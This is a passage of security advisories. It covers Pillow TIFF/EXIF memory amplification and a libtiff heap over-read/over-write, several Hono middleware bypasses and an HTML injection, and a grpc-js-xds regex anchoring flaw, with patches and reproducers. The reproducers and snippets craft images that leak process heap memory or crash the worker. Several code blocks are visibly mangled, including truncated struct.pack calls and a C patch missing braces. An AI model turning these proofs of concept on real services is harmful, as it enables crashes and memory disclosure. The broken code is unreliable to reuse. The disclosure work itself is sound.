`len()` over the resulting directory's `_tagdata`. In a well-formed IFD each entry points at its own bytes, so the tag data can never be larger than the file. The script prints `BUG` if both the TIFF's `im.tag_v2` and the PNG's EXIF directory hold more than 2000× the size of their file, otherwise `OK`. On this commit each holds 412 MiB (~6000× the file) and RSS grows by about as much for each. The memory cost is entries × file size, and the file size itself grows at 12 bytes per entry, so the cost is quadratic: doubling to 12,000 entries (144 KB) gives the 1.6 GiB quoted above, and the classic-TIFF maximum of 65,535 entries (~786 KB file) comes to ~48 GiB. A JPEG APP1 segment or a WebP EXIF chunk carrying the same IFD behaves like the PNG case (for JPEG, already during `Image.open()`). ## Suggested fix The attached patch bounds the out-of-line tag data a single `ImageFileDirectory_v2.load()` call may pull in by the length of the stream it reads from. The values of a well-formed IFD do not overlap, so their total can never exceed the file; only aliased entries can push past it. `load()` now measures the stream once on entry (`fp.seek(0, io.SEEK_END)`, then back to `self._offset`; `load()` already requires a seekable `fp`, since both the TIFF plugin and `Exif` do), keeps a running `total_size` of out-of-line values, and, before the `fp.seek(offset)` / `_safe_read()` at `TiffImagePlugin.py:926-927`, warns `"Tag data larger than file. Skipping tag …"` and `continue`s for any entry that would take the total past the file size, in the same warn-and-skip idiom as the existing "Tag offset too large" check. No fixed constant is introduced and no valid file changes behaviour, including TIFFs with very large Photoshop/ImageSourceData (tag 37724) payloads, which routinely exceed 64 MB. Because `Image.Exif`, the PNG/JPEG/WebP EXIF paths and MPO all go through this one method, they are covered too. The patch adds `test_tag_data_larger_than_file` to `Tests/test_file_tiff_metadata.py`, next to `test_tag_offset`. With it applied, both paths in the reproducer drop to 1× the file size. One visible side effect: a single oversize entry now skips that tag with this warning instead of aborting the rest of the IFD via the `OSError` path. A fixed module-level cap in the style of `PngImagePlugin.MAX_TEXT_MEMORY` (e.g. a 64 MiB `TiffImagePlugin.MAX_IFD_DATA`) would be the weaker alternative on its own: a 140 KB file could still retain ~63 MiB per IFD — and a JPEG's EXIF is parsed into several IFDs (main, EXIF, GPS, Interop), so a 66 KB APP1 segment could still request roughly 1000× its size — and legitimate TIFFs with more than 64 MiB of tag data would lose those tags with a warning. It could still be added on top of the stream-length check as a user-adjustable knob. An alternative that removes the amplification entirely is to store `(offset, size)` in `_tagdata` and read lazily in `__getitem__`, which is what the class docstring already describes ("we don't decode tags unless they're asked for"); that is a larger change because `_tagdata` is shared with `ImageFileDirectory_v1` (`from_v2`/`to_v2`) and exposed as the legacy `tagdata` property, and lazy reads would need the file object to still be open when a tag is first accessed. ## The patch Skip IFD entries once the total out-of-line tag data read by ImageFileDirectory_v2.load() would exceed the size of the stream Applies to `src/PIL/TiffImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_tiff_metadata.py b/Tests/test_file_tiff_metadata.py index 7b35a0196..ccf923128 100644 a/Tests/test_file_tiff_metadata.py +++ b/Tests/test_file_tiff_metadata.py @@ -500,6 +500,21 @@ def test_tag_offset() -> None: ifd.load(f) +def test_tag_data_larger_than_file() -> None: + ifd = TiffImagePlugin.ImageFileDirectory_v2() + + # Two BYTE tags that both claim the whole 30 byte IFD as their value + tag_count = struct.pack(" None: base_ifd = TiffImagePlugin.ImageFileDirectory_v2() interop_ifd = TiffImagePlugin.ImageFileDirectory_v2(group=40965) diff --git a/src/PIL/TiffImagePlugin.py b/src/PIL/TiffImagePlugin.py index 42c1cc96c..c9d506933 100644 a/src/PIL/TiffImagePlugin.py +++ b/src/PIL/TiffImagePlugin.py @@ -892,6 +892,9 @@ class ImageFileDirectory_v2(_IFDv2Base): def load(self, fp: IO[bytes]) -> None: self.reset() self._offset = fp.tell() + fp.seek(0, io.SEEK_END) + file_size = fp.tell() + fp.seek(self._offset) try: tag_count = ( @@ -899,6 +902,7 @@ class ImageFileDirectory_v2(_IFDv2Base): if self._bigtiff else self._unpack("H", self._ensure_read(fp, 2)) )[0] + total_size = 0 for i in range(tag_count): tag, typ, count, data = ( self._unpack("HHQ8s", self._ensure_read(fp, 20)) @@ -923,6 +927,16 @@ class ImageFileDirectory_v2(_IFDv2Base): if offset >= 2**63: warnings.warn("Tag offset too large") continue + # The values of a well-formed IFD do not overlap, so in + # total they cannot be larger than the file they are read + # from. Do not let entries that alias the same bytes load + # many copies of it. + total_size += size + if total_size > file_size: + warnings.warn( + f"Tag data larger than file. Skipping tag {tag}" + ) + continue fp.seek(offset) data = ImageFile._safe_read(fp, size) fp.seek(here) ``` ## The reproducer
Reproducer — repro, 2,254 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # ImageFileDirectory_v2.load(): N IFD entries that all alias the file body make # Image.open() (TIFF) and getexif() (PNG eXIf etc.) retain ~N copies of the file. # Pure Python, stock Pillow in /src. Needs ~1 GB RAM, runs in ~1 s. import io, struct, resource from PIL import Image resource.setrlimit(resource.RLIMIT_AS, (4 << 30, 4 << 30)) # MemoryError, not OOM-killer def aliased_ifd(n_alias, real=()): """Classic LE TIFF: header + one IFD. n_alias BYTE tags each cover the whole file.""" n = len(real) + n_alias size = 8 + 2 + 12 * n + 4 ents = {t: struct.pack(" Image.open() only real = {256: (3, 1), 257: (3, 1), 258: (3, 8), 259: (3, 1), 262: (3, 1), 273: (4, 8), 278: (3, 1), 279: (4, 1)} tif = aliased_ifd(6000, real) r0 = rss(); im = Image.open(io.BytesIO(tif)); r1 = rss() held_t = sum(len(v) for v in im.tag_v2._tagdata.values()) print(f"TIFF {len(tif)} B, {im.size} {im.mode}: Image.open() keeps {held_t >> 20} MiB of tag data " f"({held_t // len(tif)}x file); RSS {r0 >> 20} -> {r1 >> 20} MiB") # 2) Same IFD as EXIF in a 1x1 PNG -> im.getexif() (what ImageOps.exif_transpose calls) exif = aliased_ifd(6000) buf = io.BytesIO(); Image.new("L", (1, 1)).save(buf, "PNG", exif=exif); png = buf.getvalue() r0 = rss(); im2 = Image.open(io.BytesIO(png)); e = im2.getexif(); r1 = rss() held_e = sum(len(v) for v in e._info._tagdata.values()) if e._info is not None else 0 print(f"PNG {len(png)} B: getexif() keeps {held_e >> 20} MiB ({held_e // len(png)}x file); " f"RSS {r0 >> 20} -> {r1 >> 20} MiB") # A well-formed IFD's values cannot exceed the stream they come from (1x). print("BUG" if held_t > 2000 * len(tif) and held_e > 2000 * len(png) else "OK") ```

```
============================================================================
ANT-2026-CS7N494P  [high]  CWE-787  memory-safety
Heap buffer overflow saving TIFF with libtiff when tags override image size
Location: src/libImaging/TiffDecode.c:1035  in ImagingLibTiffEncode()
Commit:   a707c6b21c313880d0771e54965d142dd42358b6
============================================================================
```

When Pillow saves an image as a compressed TIFF, size information taken from the image's metadata can make the encoder read past the end of a heap buffer. Someone who uploads an image can use this to get the server process's memory, including pointers, copied into the saved file, or to crash the process. When the metadata also enables TIFF "Predictor=2" compression, the encoder writes past the buffer instead, corrupting the heap and aborting the process. This affects applications that write TIFF through libtiff (any `compression=` other than raw) and either carry the source metadata across with `exif=im.getexif()` / `tiffinfo=`, or simply re-save a crafted palette TIFF with `Image.open(f).save(out, "TIFF")`, which inherits its compression and predictor from the upload.

In `TiffImagePlugin._save`'s libtiff branch, only `BitsPerSample` is pinned to the real image when the tag list for the encoder is built (`src/PIL/TiffImagePlugin.py:1955`). `ImageWidth`, `ImageLength` and `PlanarConfiguration` are set from `im.size` but are then overwritten by the `exif=`/`tiffinfo=` merge loop at `:1768-1772`. `SamplesPerPixel` is never set for single-band modes, so a value from the caller's tags or from the source TIFF's own IFD reaches `TIFFSetField`. `ImagingLibTiffEncode` then passes a row buffer sized from the actual image (`src/encode.c:291`) to `TIFFWriteScanline` (`src/libImaging/TiffDecode.c:1035`) with no check against `TIFFScanlineSize()`, and libtiff consumes a full scanline of the tag-described width from it.

The attached reproducer demonstrates the read case. A 64x4 greyscale JPEG whose EXIF says `SamplesPerPixel=3, Photometric=RGB` is converted into a valid RGB TIFF in which 128 bytes of each row are live heap, including pointers that change from run to run. The same JPEG with EXIF `ImageWidth=2**27` kills the process with SIGSEGV. For the write case, the values written are byte-wise differences of existing heap contents rather than attacker-chosen data, and nothing beyond the observed glibc abort is shown. The `tiffinfo=` route dates back to Pillow 2.3.0 (`dbf47837ce99`), and the `exif=` route to 8.4.0 (`c0f619384cbc`).

## Details

When an image is saved as TIFF through the libtiff encoder (any `compression=` other than raw, or `TiffImagePlugin.WRITE_LIBTIFF`), libtiff sizes its scanline from the `ImageWidth` / `SamplesPerPixel` / `BitsPerSample` / `PlanarConfiguration` tags it was handed, Pillow sizes the encoder row buffer from the real image, and nothing compares the two. In `TiffImagePlugin._save`'s libtiff branch only `BitsPerSample` is pinned in the attribute dict given to the encoder (`atts`, `src/PIL/TiffImagePlugin.py:1955-1982`); the other geometry tags can come from caller- or attacker-supplied data:

- `ImageWidth` (256), `ImageLength` (257) and `PlanarConfiguration` (284) are set from `im.size` *before* the `tiffinfo=` / `exif=` merge loop at `:1768-1772`, so they are overwritten by it — by the EXIF of an uploaded JPEG, or by stale geometry in `im.getexif()` / `im.tag_v2` of a TIFF that Pillow auto-transposed on load (Orientation tag) or that the application `thumbnail()`ed.
- `SamplesPerPixel` (277) is only put in the IFD for multi-band modes (`:1847-1850`), so for single-band images (`L`, `P`, `I;16`, `1`, …) a value from `exif=` / `tiffinfo=`, or from the *source TIFF's own IFD* via `supplied_tags` (`im.tag_v2`, `:1782`), is forwarded to libtiff. A palette TIFF with `SamplesPerPixel=2, BitsPerSample=(8,8), ExtraSamples=(0,)` opens as mode `P` (rawmode `PX`, extra sample dropped), and a bare `im.save(out, "TIFF")` — no save arguments; `compression` and `Predictor` are inherited from the source — already makes libtiff process `2*width` bytes per row from a `width`-byte buffer.

`ImagingLibTiffEncode` then hands the image-sized row buffer to `TIFFWriteScanline`, and libtiff reads one scanline of the *tag-described* geometry out of a buffer holding one row of the *actual* image. With `Predictor = 2` (also forwarded from `tiffinfo=` / `im.tag_v2`) libtiff's horizontal differencing first rewrites the whole scanline **in place**, so the over-read becomes an out-of-bounds heap **write** on every row.

The tags do not have to be supplied deliberately by the application: `im.getexif()` of an uploaded JPEG returns whatever IFD0 tags the file carries, and the common metadata-preserving conversion

```python
im = Image.open(uploaded_jpeg)                                   # 64x4, mode "L"
im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")
```

behaves as follows on the stock build at this commit:

- EXIF IFD0 `{277: 3, 262: 2}` (SamplesPerPixel=3, Photometric=RGB): the save succeeds and `out` is a 64x4 **RGB** TIFF. Re-opening it, the first 64 bytes of every 192-byte row are the image (0x11 fill); the remaining 128 bytes are heap that followed the 64-byte row buffer — e.g. `... 807a97e6527f0000 ... f03632e5527f0000 40832ee5527f0000` (x86-64 heap pointers), different on every run.
- EXIF IFD0 `{256: 1<<27}` (ImageWidth=2^27): the process dies with SIGSEGV; gdb shows `TIFFWriteScanline (libtiff.so.6) ← ImagingLibTiffEncode (src/libImaging/TiffDecode.c:1035) ← _encode (src/encode.c:139)`.
- valgrind on the first case: `Invalid read of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode … Address is 0 bytes after a block of size 64 alloc'd at calloc by _setimage`.
- Control: the same JPEG with an EXIF holding only `Software` produces a 64x4 `L` TIFF whose 256 pixel bytes are all 0x11.

The write variant needs nothing more than a well-formed 222-byte TIFF and the `exif=im.getexif()` idiom the project's own tests use (`Tests/test_file_tiff.py::test_exif`, `test_modify_exif`); the interpreter dies with glibc's `free(): invalid next size (fast)` (SIGABRT):

```python
from PIL import Image; import io
b = io.BytesIO()
Image.new("RGB", (64, 4)).save(b, "TIFF", compression="tiff_lzw", tiffinfo={274: 6, 317: 2})  # Orientation=6, Predictor=2
im = Image.open(io.BytesIO(b.getvalue())); im.load()   # auto-transposed to 4x64; tag_v2/getexif() still say 64x4
im.save(io.BytesIO(), "TIFF", exif=im.getexif())       # or tiffinfo=im.tag_v2
```

Here libtiff processes 192-byte rows (64 px × 3 samples) from the 12-byte buffer `_setimage` allocated for a 4-pixel RGB row, and `PredictorEncodeRow` rewrites the 180 heap bytes that follow it on each of 64 rows; valgrind on a `-g` build reports `Invalid write of size 1 … TIFFWriteScanline … by ImagingLibTiffEncode (TiffDecode.c:1035) … Address is 0 bytes after a block of size 12 alloc'd … by _setimage (encode.c:293)`. `im.thumbnail((8, 8))` before the save instead of the Orientation tag reaches the same state, as does the purely programmatic `Image.new("RGB", (128, 32)).save(fp, "TIFF", compression="tiff_lzw", tiffinfo={256: 1024, 257: 128, 317: 2})` (SIGSEGV). For the source-IFD `SamplesPerPixel` route, a crafted <2 KB palette `PX` TIFF with `Compression = LZW, Predictor = 2` kills the stock build on a bare `Image.open(f).save(out, "TIFF")`; with a predictor-less codec the same re-save returns normally with `width` bytes of heap per row encoded into the output.

### Walk-through

The geometry is only partially re-asserted afterwards: `BITSPERSAMPLE` is always set, but `SAMPLESPERPIXEL` only for multi-band modes and `IMAGEWIDTH`/`IMAGELENGTH` never:

For the SamplesPerPixel=3 example the tag list passed to the encoder is `[(256, 64), (257, 4), (258, 8), (259, 5), (262, 2), (277, 3), (278, 4), (284, 1)]`; for the ImageWidth example it is `[(256, 134217728), (257, 4), (258, 8), …]`. 256 and 277 are in `core_tags` (`src/encode.c:694`), so `PyImaging_LibTiffEncoderNew` forwards them straight to `TIFFSetField`. For a single-band image `SAMPLESPERPIXEL` is absent from `ifd`, so the loop takes tag 277 from `supplied_tags` — the source TIFF's IFD — when one is present; the `PLANAR_CONFIGURATION == 2` adjustment at `:1783-1788` already compensates for this for separate-planes sources, the contiguous `PX` layout is the remaining case.

`encoder.setimage` sizes the packer's row buffer from the real image — 64 bytes for a 64-pixel `L` row:

```c
/* src/encode.c, _setimage */
287    if (state->bits > 0) {
291        state->bytes = (state->bits * state->xsize + 7) / 8;
293        state->buffer = (UINT8 *)calloc(1, state->bytes);
```

and `ImagingLibTiffEncode` packs one image row into it and gives the pointer to libtiff with no length:

```c
/* src/libImaging/TiffDecode.c */
1027        while (state->y < state->ysize) {
1028            state->shuffle(state->buffer, (UINT8 *)im->image[state->y + state->yoff] + …, state->xsize);
1035            if (TIFFWriteScanline(tiff, (tdata_t)(state->buffer), (uint32_t)state->y, 0) == -1) {
```

`TIFFWriteScanline` consumes `TIFFScanlineSize()` bytes, i.e. `ImageWidth * SamplesPerPixel * BitsPerSample / 8` as set through the tags. Nothing between `_save` and line 1035 compares that with `state->bytes`. With SamplesPerPixel=3 libtiff reads 192 bytes from the 64-byte block and LZW-encodes the trailing 128 heap bytes into the strip; with ImageWidth=2^27 it reads 128 MiB starting at the 64-byte block and faults. With `Predictor = 2`, libtiff's `PredictorEncodeRow` first runs horizontal differencing in place over the whole scanline (`bp[i] -= bp[i-stride]`), i.e. it rewrites the heap bytes that follow the block before encoding them; libtiff grows `ImageLength` as rows beyond the declared count are written, so every row of the real image goes through. A `PlanarConfiguration = 2` carried over from a planar source reaches libtiff by the same route; there libtiff's scanline (one sample plane) is shorter than Pillow's row, so the result is an undecodable file rather than an out-of-bounds access.

The non-libtiff path (`compression` absent/raw) is not affected: it goes through `ImagingRawEncode`, which treats the IFD-derived stride as padding and either zero-fills or fails with `IMAGING_CODEC_CONFIG` (`src/libImaging/RawEncode.c:34-37,57-59`). Overriding `IMAGEWIDTH`/`IMAGELENGTH` through `tiffinfo` on that path is an intended feature (`Tests/test_file_tiff.py::test_tiff_chunks`).

The `exif=` route was introduced in `c0f619384cbc` ("Added "exif" keyword argument to save Image.Exif instance", 2021-07-04), first released in 8.4.0. The same override through `tiffinfo=` is older: it dates back to `dbf47837ce99` ("Add arbitrary tags to tiff images using an ImageFileDirectory", 2013-10-02, first in 2.3.0). The stale-geometry-from-the-file-itself form dates from `1b70a4c6b515` ("Use TIFF orientation", 2019-09-13, first in 6.2.0), which added the transpose on load.

## Impact

Affected are applications that write TIFF output from user-supplied images through libtiff. Through the source-IFD `SamplesPerPixel` route nothing more is needed than `Image.open(f).save(out, "TIFF")` (format normalisation) on a crafted palette TIFF: `Compression`, `SamplesPerPixel` and `Predictor` are all inherited from the upload, so the uploader chooses between heap corruption / worker abort (`Predictor = 2`) and a normally-returning save whose output carries `width` bytes of the worker's heap per row. The `exif=` / `tiffinfo=` routes cover applications that convert to compressed TIFF while carrying the metadata across — `im.save(..., "TIFF", compression="tiff_lzw"|"tiff_adobe_deflate"|"packbits"|"jpeg"|…, exif=im.getexif())`, `exif=im.info["exif"]`, or `tiffinfo=` built from the source file's tags. Neither option is a default, but both are ordinary settings for archival/print/scan pipelines and the idiom used in Pillow's own tests. The uploader then chooses the outcome through a few EXIF shorts: a small `SamplesPerPixel` (with a matching `Photometric` so the result is a valid RGB/CMYK TIFF) returns `(spp-1) × width` bytes of process heap per image row inside the produced file — for a 4000-pixel-wide upload that is 8 KB of heap per row, megabytes per file, readable with any TIFF decoder and containing allocator metadata, pointers (ASLR defeat) and whatever other requests left in freed memory; a large `ImageWidth` kills the worker with SIGSEGV; `ImageWidth`/`ImageLength` larger than the (transposed or thumbnailed) image together with `Predictor = 2` writes `(declared_width − real_width) × bytes_per_pixel` bytes past a small fresh `calloc` block on every row — the values written are byte-wise differences of the existing heap contents, so the attacker controls extent and repetition but not directly the data; the observed result is heap corruption and abort of the whole worker, exploitation beyond that is not demonstrated. Because `ImageWidth`/`ImageLength` are routinely present in IFD0 of camera and scanner output, a benign photo that is resized before such a save also over-reads (its EXIF still describes the original width), so the crash variant can occur without an attacker.

## Reproducing

`repro` is a single Python script that uses the installed Pillow and only its public API; no rebuild is needed. It runs in well under a second.

It builds the attacker's input in memory: a 64x4 JPEG in mode `L` with every pixel set to 0x11, plus a chosen set of EXIF IFD0 tags. It then runs the metadata-preserving conversion an application would do:

```python
im = Image.open(io.BytesIO(jpeg))
im.save(out, "TIFF", exif=im.getexif(), compression="tiff_lzw")
```

Finally it re-opens the TIFF that comes out. There are three cases:

- **control**: the EXIF holds only `Software`. The output is a 64x4 `L` TIFF whose 256 bytes are all 0x11. The verdict can only be `BUG` if this holds.
- **leak**: the EXIF holds `SamplesPerPixel=3, PhotometricInterpretation=RGB`. libtiff now treats each scanline as 192 bytes, but the row buffer only holds 64 bytes. The save still succeeds and the output is a 64x4 **`RGB`** TIFF. In each 192-byte row, the first 64 bytes are the image (0x11). The other 128 bytes are whatever sat in the heap after the 64-byte row buffer.
  - The script hex-dumps row 0's extra bytes. They include x86-64 pointers such as `…e06c297e677f0000`, which change from run to run because of ASLR.
  - It also counts the extra bytes that are neither 0x11 nor 0x00, since those could not have come from the image or from zero padding. On the stock build this is a few hundred of the 512 bytes (200–310 in our runs).
- **crash**: the EXIF holds `ImageWidth=2**27`. The script re-runs itself as a child process (`repro crash`) with core dumps disabled. libtiff tries to read 128 MiB out of the 64-byte buffer, and the child dies with SIGSEGV (exit code -11).

Expected output on the stock build (the heap bytes and the count vary):

```
control: L (64, 4), all bytes 0x11: True
leak:    RGB (64, 4)
         first 64 bytes of each row are the image (0x11): True
         row 0, bytes 64..192 (past the row buffer):
           0000000000000000310000000000000090e5b50669550000e06c297e677f0000
           0000000001007900007b8804d80c0d8830000000000000001007000000000000
           0100000000000000801a897e677f0000240300000000000030444a7d677f0000
           4095487d677f0000885f897e677f000003000001010000000000000000000000
         220 of 512 bytes past the row buffers are neither 0x11 nor 0x00
crash:   child exit code -11 (SIGSEGV)
BUG
```

The last line is `BUG` if the control is clean and the leak case produced foreign bytes, the crash case died with SIGSEGV/SIGBUS, or both. Otherwise it is `OK`.

With either attached patch applied and rebuilt, the script prints:

```
control: L (64, 4), all bytes 0x11: True
leak:    output is not a readable image (no over-read)
crash:   child exit code 0 (no signal)
OK
```

In the leak case, the fixed build writes the image's real single sample per pixel but keeps the supplied `Photometric=RGB`. Pillow will not open a TIFF like that.

The out-of-bounds write variant is the three-line `Orientation=6, Predictor=2` snippet in Details (SIGABRT, `free(): invalid next size (fast)` on the stock build); for a file:line stack run it under valgrind on a `-g` build of the extensions.

## Suggested fix

Two alternative patches are attached. Patch 2 is the Python-only subset of patch 1; patch 1 also hardens the C encoder.

**Attached patch 1** (`src/PIL/TiffImagePlugin.py`, `src/libImaging/TiffDecode.c`) does two independent things:

1. `src/PIL/TiffImagePlugin.py:1955` — the libtiff branch already pre-seeds `atts` with `BITSPERSAMPLE` so that no supplied tag can replace it. The patch extends that to the other tags that determine libtiff's scanline size, taken from the image being saved:

```diff
-        atts: dict[int, Any] = {BITSPERSAMPLE: bits[0]}
+        atts: dict[int, Any] = {
+            BITSPERSAMPLE: bits[0],
+            SAMPLESPERPIXEL: len(bits),
+            IMAGEWIDTH: im.size[0],
+            IMAGELENGTH: im.size[1],
+            PLANAR_CONFIGURATION: 1,
+        }
```

   Doing it here rather than in the IFD built at 1749–1772 leaves the raw-writer behaviour exercised by `test_tiff_chunks` untouched, and because the merge loop visits `ifd` and `supplied_tags` only for tags not already in `atts`, it closes the `exif=`, `tiffinfo=` and source-IFD (`im.tag_v2`) routes alike. A supplied `PHOTOMETRIC_INTERPRETATION` still reaches the file (so EXIF `{277:3, 262:2}` now yields a 1-sample "RGB" TIFF that Pillow refuses to open); whether to force it to the mode's value is a format decision that no longer affects memory safety. For the re-saved `PX` palette case it may also be worth dropping the source's `EXTRASAMPLES` from `supplied_tags` (meaningless once the extra channel was discarded on load), as is already done for the planar case at `:1783-1788`, so the output is a self-consistent 1-sample palette file.

2. `src/libImaging/TiffDecode.c`, `ImagingLibTiffEncode` — before the scanline loop, it refuses any configuration in which libtiff would read more than the packer produced, so the encoder stays safe regardless of where tags come from:

```c
        if (TIFFScanlineSize64(tiff) > (uint64_t)state->bytes) {
            state->errcode = IMAGING_CODEC_CONFIG;
            ImagingLibTiffEncodeCleanup(state);
            clientstate->tiff = NULL;
            if (!clientstate->fp) {
                free(clientstate->data);

            return -1;

```

   The same cleanup is applied to the existing `TIFFWriteScanline` error path. For in-memory output, that path currently frees `clientstate->data` but leaves `clientstate->tiff` set, so the later `ImagingLibTiffEncodeCleanup` → `TIFFClose` → `TIFFFlush` writes into the freed buffer. Both error paths now close the TIFF before the data is freed. The `TIFFFlush` failure branch further down (`src/libImaging/TiffDecode.c:1056`) has the same pattern and is left as it is.

**Attached patch 2** (`src/PIL/TiffImagePlugin.py` only) is step 1 above without the C changes, for maintainers who prefer not to touch the encoder. It closes every public-API route (`exif=`, `tiffinfo=`, a resized or transposed image's carried-over EXIF/`tag_v2`) by which these tags reach `TIFFSetField`. `ImagingLibTiffEncode` still trusts its tag list, though, and the error-path use-after-free described above stays as it is.

Both patches add `Tests/test_file_libtiff.py::test_geometry_tags`, parametrised over oversized `IMAGEWIDTH`/`IMAGELENGTH`, `SAMPLESPERPIXEL=3` and `PLANAR_CONFIGURATION=2`. With either patch applied to a clean checkout and rebuilt, `repro` prints `OK`, the `Predictor = 2` snippet in Details saves a 4×64 image normally, and the existing TIFF test suites still pass.

### Summary

`csrf()` validates a request only when its `Content-Type` is one of the three types an HTML form can send. Chromium's hyperlink auditing (`<a ping>`) sends a cross-origin POST with the user's cookies and the content type `text/ping`, which is not in that list. The middleware does not look at `Origin` or `Sec-Fetch-Site` for such a request, so it is passed to the handler.

### Details

The middleware skips the origin check when the content type is not one that a form submission produces. The assumption was that any other content type requires a CORS preflight and therefore cannot be sent cross-origin with credentials. Hyperlink auditing is an exception: Chrome and Edge send the ping as a credentialed POST without a preflight, with a fixed body and `Content-Type: text/ping`.

A page on another origin can therefore trigger a POST to any URL of the application. The `csrf()` options for `origin` and `secFetchSite` do not change the outcome, because neither header is evaluated for the request.

The request body is fixed, so only actions whose effect does not depend on the body can be triggered. Firefox does not send pings by default. As with any CSRF, the user's cookie must be sent with the request, which with the default `SameSite=Lax` means a same-site origin or a cookie set with `SameSite=None`.

### Impact

A user who visits a malicious page in Chrome or Edge while logged in to an application protected by `csrf()` can be made to send a state-changing request to that application, such as logging out, deleting a resource, or toggling a setting that is selected by the path or query string.

This issue affects applications that rely on `csrf()` as their CSRF protection and expose state-changing endpoints whose effect does not depend on the request body.

### Workarounds

Reject requests with a `Content-Type` of `text/ping` in a middleware registered before `csrf()`, or set session cookies with `SameSite=Strict`.

### Summary

`validator('form')` only recognizes a `multipart/form-data` `Content-Type` that carries nothing but a single `boundary` parameter. A request with another legal parameter, such as `charset`, or with extra whitespace after the `;` is not recognized as a form. The validation callback then receives an empty object, while `c.req.parseBody()` still parses the body as a form.

### Details

The check that decides whether a request body is a form was written as a strict pattern over the whole `Content-Type` value. Any parameter list that does not look exactly like `; boundary=...` fails the check. When it fails, the middleware does not read the body and passes an empty object to the validation callback. If the callback accepts an empty object, the request proceeds to the handler, which can still read all submitted fields through `c.req.parseBody()` or `c.req.formData()`.

`application/x-www-form-urlencoded` is not affected. Only the `multipart/form-data` branch has the strict pattern.

This issue arises when an application relies on `validator('form')` to reject or restrict fields and the validation callback does not fail on an empty object.

### Impact

An unauthenticated client can send form fields that the `form` validator never sees, by adding a legal parameter to the `Content-Type` header.

This may lead to:

- Allow-list or required-field checks in the validator being skipped
- Fields the application intended to reject reaching the handler

This issue affects applications that use `validator('form')` with `multipart/form-data` requests and whose validation callback accepts an empty object.

### Workarounds

Reject an empty object in the `validator('form')` callback, or validate the result of `await c.req.parseBody()` in the handler.

### Summary

`mount()` and `app.mount()` remove the mount prefix from the request path and forward the rest to the mounted application. Two mistakes in that step let a crafted request reach a route of the mounted application that the outer application protects with path-scoped middleware, such as an authentication check on `/app/admin/*`. The outer application routes on the original path, so the middleware does not run.

### Details

1. **Dynamic prefix** (all affected versions): for a mount such as `/api/:tenant/*`, the prefix was removed by the length of the route pattern, not of the matched prefix. A request with a longer or shorter first segment is cut in the middle, so `/api/a/xxxxx/admin/secret` reaches the mounted application as `/admin/secret`.
2. **Re-normalization** (since 4.12.21): the forwarded path was built from the decoded request path and assigned to `url.pathname`, which turns a decoded backslash into `/` and collapses `..`. `/app/public%5C..%5Cadmin/secret` reaches the mounted application as `/admin/secret`.

The fix removes the prefix segment by segment from the raw pathname, using the matched parameter values for its length. Route patterns that cannot be handled safely now throw: duplicate parameter names and a wildcard inside the last segment such as `/assets*`. A trailing slash in an `app.mount()` prefix no longer removes an extra segment.

### Impact

An unauthenticated client can reach a route of a mounted application that the outer application protects with path-scoped middleware.

This affects applications that use `mount()` or `app.mount()` and rely on middleware registered on a sub-path inside the mount prefix for authentication or authorization.

### Workarounds

Register the authentication middleware inside the mounted application.

### Summary

RegExpRouter, which the default `SmartRouter` selects for most applications, skipped wildcard middleware in three cases, so a route handler ran without the middleware registered for it:

1. Middleware whose parameter is written with the explicit default pattern, such as `/api/:tenant{[^/]+}/admin/*`, was not applied to a route written as `/api/:tenant/admin/:id`. (since 4.13.0)
2. Middleware on `/admin/*` was not applied to a route registered on `/admin*` for paths under `/admin/`. (since 4.1.4)
3. For a path with an encoded line terminator (`%0A`, `%0D`, `%E2%80%A8`, `%E2%80%A9`), no wildcard pattern matched, so the request reached the not-found handler without any wildcard middleware. (since 4.4.0)

TrieRouter, LinearRouter and PatternRouter apply the middleware in all three cases.

### Details

RegExpRouter decides at registration time which wildcard middleware covers which route. In cases 1 and 2 it treated patterns that match the same requests as different ones. In case 3 the compiled wildcard did not match line terminators.

The fix derives the coverage from the structure of the registered paths and lets wildcards match line terminators. It also corrects other differences from the other routers (a wildcard in the middle of a path with parameters, duplicate middleware, middleware on static routes), and rejects custom patterns that can match the empty string, such as `{[0-9]*}`, with `UnsupportedPathError`. `PreparedRegExpRouter` data must be regenerated.

### Impact

An unauthenticated client can reach a route handler, or the not-found handler, without the authentication or authorization middleware registered on a wildcard path.

This affects applications that use RegExpRouter, directly or through the default `SmartRouter`, and rely on wildcard middleware for authentication or authorization.

### Workarounds

Use `new Hono({ router: new TrieRouter() })`.

### Summary

The `css` helper in `hono/css` escapes a `/` that follows `<` inside an interpolated value so that a value cannot close the `<style>` element. The check only looks inside each value. When the text before a value ends with `<`, whether that is the template itself or an earlier interpolated value, and the next value starts with `/`, the `/` is not escaped and the combined output contains an unescaped closing tag.

### Details

Interpolated string values are escaped one at a time before they are joined with the surrounding template text. The rule that neutralizes `</` therefore cannot see a `<` that belongs to the template. A template such as a `content` declaration that opens with a literal `<` and interpolates a string right after it produces a raw `</style>` when that string starts with `/style>`. During server-side rendering the `<Style />` element is closed early and the rest of the value is interpreted as HTML.

This issue arises only when `<` is the last character before an interpolation in a `css` template, either written in the template or supplied by a preceding value, and the interpolated value is controlled by a client.

### Impact

A client that controls such a value can inject HTML, including script, into the page rendered on the server.

This may lead to:

- Execution of attacker-controlled script in the browser of a user who views the page
- Exposure of information available to that page

This issue affects applications that interpolate untrusted strings into a `css` template immediately after a `<`, including two adjacent interpolations such as `${prefix}${name}` where both are untrusted. Other uses of the `css` helper are not affected.

### Workarounds

Do not interpolate untrusted values into `css` templates, or make sure the text before an interpolated value does not end with `<`.

### Summary

The StringMatcher/PathMatcher for `safe_regex` builds its RE2 as `^${regex}$` with no surrounding group. Because alternation has the lowest precedence, a pattern `"a|b|c"` compiles to `/^a|b|c$/` -- "starts with a" OR "contains b" OR "ends with c" instead of a full match of the whole value. Configurations with `safe_regex` matchers that use a regex alternation (a natural way to list methods or service identities) therefore apply partial string matches. This impacts route selection, xDS credentials, and RBAC.

### Details

`src/matcher.ts`: `SafeRegexValueMatcher` and `PathSafeRegexValueMatcher` both do
```ts
this.targetRegexImpl = new RE2(`^${targetRegex}$`, 'u');
```

and `apply()` returns `targetRegexImpl.test(value)`. With a top-level alternation the anchors bind only to the first/last branch.

https://github.com/grpc/grpc-node/blob/e742b11bd8039f3dbea4cd29afdf5d95a8ba6b92/packages/grpc-js-xds/src/matcher.ts#L59

